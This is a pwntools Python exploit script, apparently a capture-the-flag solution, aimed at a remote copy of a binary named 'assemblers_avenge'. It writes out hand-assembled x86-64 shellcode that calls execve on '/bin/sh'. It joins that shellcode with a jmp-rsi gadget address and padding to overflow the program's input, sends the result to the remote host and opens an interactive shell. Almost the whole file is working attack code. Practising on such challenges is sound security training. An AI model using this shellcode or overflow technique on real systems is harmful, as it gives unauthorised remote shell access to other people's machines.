from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "./assemblers_avenge"
binary = ELF("./assemblers_avenge")
#libc = ELF("libc.so.6")

# Same syntax as python2
p = remote("94.237.53.113", 32321)
#p = process("./assemblers_avenge")
#p = gdb.debug("./assemblers_avenge", '''
#break *0x401091''')

# RSI is overflowed, registers is controlled by user "A" * 8
# overwrite characters with shellcode
jmp_rsi = p64(0x000000000040106b)
jmp_rbp = b"\xff\xe5"
ret11 = p64(0x0000000000401037)
ret = p64(0xc3)
jmp_rsp = b"\xff\xe4"
_start = p64(0x0000000000401000)


rax_3b = b"\x48\xC7\xC0\x3B\x00\x00\x00"
rdi_binsh = b"\x48\xC7\xC7\x65\x20\x40\x00"
syscall = b"\x0F\x05"
binsh = p64(0x402065)


# shellcode1 = 14 bytes + 2 bytes for jmp_rsp
shellcode1 = b"\x31\xD2\x31\xF6\xB8\x3B\x00\x00\x00\xBF\x65\x20\x40\x00\x0F\x05"

padding1 = b"A" * 16
padding2 = b"B" * 8
padding3 = b"C" * 32


# python3 doesn't like concatenating differing data types within a variable, python3
# WRONG: payload = str + bytes  # Concats different datatypes in variable, python2
# RIGHT: str = b'hello'
#        bytes = b'\x41\x41'
#        payload = str + byte   # Concats variables with different datatypes.
#        p.sendline(payload)
#

# shellcode + ret11 = padding
# RIP -> ret11
# shellcode_1_2
payload = shellcode1 + jmp_rsi + padding3

p.sendline(payload)
p.interactive()

